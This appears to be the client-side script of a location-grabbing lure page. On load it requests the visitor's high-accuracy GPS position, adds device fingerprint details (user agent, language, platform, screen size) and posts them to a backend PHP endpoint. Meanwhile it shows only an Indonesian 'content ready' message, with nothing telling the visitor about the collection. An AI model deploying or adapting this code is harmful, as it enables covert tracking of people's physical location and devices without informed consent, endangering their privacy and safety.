document.addEventListener("DOMContentLoaded", () => {
    const statusEl = document.getElementById("status-text");

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                sendData({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                sendData({ error: error.message });
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    } else {
        sendData({ error: "Geolocation not supported" });
    }

    function sendData(geoData) {
        const payload = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${window.screen.width}x${window.screen.height}`,
            ...geoData
        };

        fetch("../backend/server.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(() => {
            statusEl.textContent = "Konten siap.";
        })
        .catch(() => {
            statusEl.textContent = "Gagal memuat.";
        });
    }
});
